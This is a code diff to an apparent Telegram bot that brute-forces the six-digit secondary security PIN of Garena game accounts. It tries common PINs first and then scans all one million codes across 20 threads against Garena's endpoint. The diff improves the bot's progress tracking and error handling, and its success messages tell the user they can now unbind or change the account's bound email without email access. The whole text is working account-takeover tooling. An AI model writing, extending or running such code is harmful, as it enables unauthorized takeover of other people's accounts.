@@ -2,6 +2,8 @@
 
 import asyncio
 import concurrent.futures
+import hashlib
+import html
 import logging
 import os
 import threading
@@ -944,20 +946,14 @@ async def run_brute_force(
     def test_single_code(code_str: str) -> bool:
         if stop_event.is_set():
             return True
-        sec_hash = hashlib.sha256(code_str.encode()).hexdigest().upper()
         try:
+            sec_hash = hashlib.sha256(code_str.encode()).hexdigest().upper()
             resp = requests.post(
                 url, headers=GARENA_HEADERS,
                 data={"email": email, "app_id": GARENA_APP_ID,
                       "access_token": access, "secondary_password": sec_hash},
                 timeout=12
             )
-            with counter_lock:
-                attempt_counter[0] += 1
-                current = attempt_counter[0]
-            if current % 300 == 0 and session_id:
-                db.update_bf_progress(session_id, current)
-
             result = resp.json()
             if result.get("result") == 0:
                 stop_event.set()
@@ -968,76 +964,113 @@ async def run_brute_force(
                 return True
         except Exception:
             pass
+        finally:
+            with counter_lock:
+                attempt_counter[0] += 1
+                current = attempt_counter[0]
+            # Update database in real-time (every attempt for early pins, then every 25)
+            if session_id and (current <= 20 or current % 25 == 0):
+                try:
+                    db.update_bf_progress(session_id, current)
+                except Exception:
+                    pass
         return False
 
-    # 1. Test top common PINs first for instant hit
-    for p in PRIORITY_PINS:
-        if test_single_code(p):
-            break
-
-    # 2. Parallel scan across 000000-999999 if not yet found
-    if not result_holder and not stop_event.is_set():
-        def try_range(start: int, end: int) -> None:
-            for code in range(start, end):
-                if stop_event.is_set():
-                    return
-                code_str = f"{code:06d}"
-                test_single_code(code_str)
-
-        NUM_THREADS, TOTAL = 20, 1_000_000
-        chunk = TOTAL // NUM_THREADS
-
+    try:
         loop = asyncio.get_event_loop()
-        def run_pool() -> None:
-            with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_THREADS) as ex:
-                futures = [
-                    ex.submit(try_range, i * chunk,
-                              (i + 1) * chunk if i < NUM_THREADS - 1 else TOTAL)
-                    for i in range(NUM_THREADS)
-                ]
-                concurrent.futures.wait(futures)
 
-        await loop.run_in_executor(None, run_pool)
+        def run_all() -> None:
+            # 1. Test top common PINs first for instant hit
+            for p in PRIORITY_PINS:
+                if stop_event.is_set() or result_holder:
+                    return
+                if test_single_code(p):
+                    return
 
-    if result_holder:
-        r = result_holder[0]
-        if log_id:
-            db.update_result(log_id, "success", details=f"Security Code: {r['code']}")
+            # Save progress after priority batch
+            if session_id:
+                try:
+                    db.update_bf_progress(session_id, attempt_counter[0])
+                except Exception:
+                    pass
+
+            # 2. Parallel scan across 000000-999999 if not yet found
+            if not result_holder and not stop_event.is_set():
+                def try_range(start: int, end: int) -> None:
+                    for code in range(start, end):
+                        if stop_event.is_set() or result_holder:
+                            return
+                        code_str = f"{code:06d}"
+                        if test_single_code(code_str):
+                            return
+
+                NUM_THREADS, TOTAL = 20, 1_000_000
+                chunk = TOTAL // NUM_THREADS
+                with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_THREADS) as ex:
+                    futures = [
+                        ex.submit(try_range, i * chunk,
+                                  (i + 1) * chunk if i < NUM_THREADS - 1 else TOTAL)
+                        for i in range(NUM_THREADS)
+                    ]
+                    concurrent.futures.wait(futures)
+
+        await loop.run_in_executor(None, run_all)
+
+        final_attempts = attempt_counter[0]
+        if result_holder:
+            r = result_holder[0]
+            if log_id:
+                db.update_result(log_id, "success", details=f"Security Code: {r['code']}")
+            if session_id:
+                db.end_bf_session(session_id, "success", found_code=r["code"], attempts=final_attempts)
+            await bot.send_message(
+                chat_id=chat_id,
+                text=(
+                    "🎯 <b>Security Code Mil Gaya!</b>\n"
+                    "━━━━━━━━━━━━━━━━━━━━━━\n"
+                    f"🔢 <b>Security Code (PIN):</b> <code>{r['code']}</code>\n"
+                    f"🎫 <b>Identity Token:</b> <code>{r['identity_token']}</code>\n\n"
+                    "✅ <b>Ab aap bina email access ke:</b>\n"
+                    "• <b>Unbind Email</b> kar sakte hain (Option 2: Security Code)\n"
+                    "• Ya <b>Change Bind Email</b> kar sakte hain!"
+                ),
+                parse_mode="HTML", reply_markup=back_kb()
+            )
+        elif stop_event.is_set():
+            if log_id:
+                db.update_result(log_id, "stopped", details="Stopped via Web Dashboard")
+            if session_id:
+                db.end_bf_session(session_id, "stopped_by_admin", attempts=final_attempts)
+            await bot.send_message(
+                chat_id=chat_id,
+                text="🛑 <b>Security Code Brute Force ko admin ne Web Dashboard se rok diya hai.</b>",
+                parse_mode="HTML", reply_markup=back_kb()
+            )
+        else:
+            if log_id:
+                db.update_result(log_id, "failed", details="000000-999999 tested, code not found")
+            if session_id:
+                db.end_bf_session(session_id, "failed", attempts=final_attempts)
+            await bot.send_message(
+                chat_id=chat_id,
+                text="❌ <b>Security Code Brute Force complete</b> — sahi code nahi mila.\n(000000–999999 sab test ho gaye)",
+                parse_mode="HTML", reply_markup=back_kb()
+            )
+    except Exception as e:
+        logging.error(f"[Brute Force Error] {e}", exc_info=True)
+        final_attempts = attempt_counter[0]
         if session_id:
-            db.end_bf_session(session_id, "success", found_code=r["code"])
-        await bot.send_message(
-            chat_id=chat_id,
-            text=(
-                "🎯 <b>Security Code Mil Gaya!</b>\n"
-                "━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"🔢 <b>Security Code (PIN):</b> <code>{r['code']}</code>\n"
-                f"🎫 <b>Identity Token:</b> <code>{r['identity_token']}</code>\n\n"
-                "✅ <b>Ab aap bina email access ke:</b>\n"
-                "• <b>Unbind Email</b> kar sakte hain (Option 2: Security Code)\n"
-                "• Ya <b>Change Bind Email</b> kar sakte hain!"
-            ),
-            parse_mode="HTML", reply_markup=back_kb()
-        )
-    elif stop_event.is_set():
+            db.end_bf_session(session_id, "failed", attempts=final_attempts)
         if log_id:
-            db.update_result(log_id, "stopped", details="Stopped via Web Dashboard")
-        if session_id:
-            db.end_bf_session(session_id, "stopped_by_admin")
-        await bot.send_message(
-            chat_id=chat_id,
-            text="🛑 <b>Security Code Brute Force ko admin ne Web Dashboard se rok diya hai.</b>",
-            parse_mode="HTML", reply_markup=back_kb()
-        )
-    else:
-        if log_id:
-            db.update_result(log_id, "failed", details="000000-999999 tested, code not found")
-        if session_id:
-            db.end_bf_session(session_id, "failed")
-        await bot.send_message(
-            chat_id=chat_id,
-            text="❌ <b>Security Code Brute Force complete</b> — sahi code nahi mila.\n(000000–999999 sab test ho gaye)",
-            parse_mode="HTML", reply_markup=back_kb()
-        )
+            db.update_result(log_id, "failed", details=f"Error: {str(e)[:100]}")
+        try:
+            await bot.send_message(
+                chat_id=chat_id,
+                text=f"⚠️ <b>Security Code Brute Force error:</b> <code>{html.escape(str(e))}</code>",
+                parse_mode="HTML", reply_markup=back_kb()
+            )
+        except Exception:
+            pass
 
 # ─── Utility Commands ─────────────────────────────────────────────────────────
 
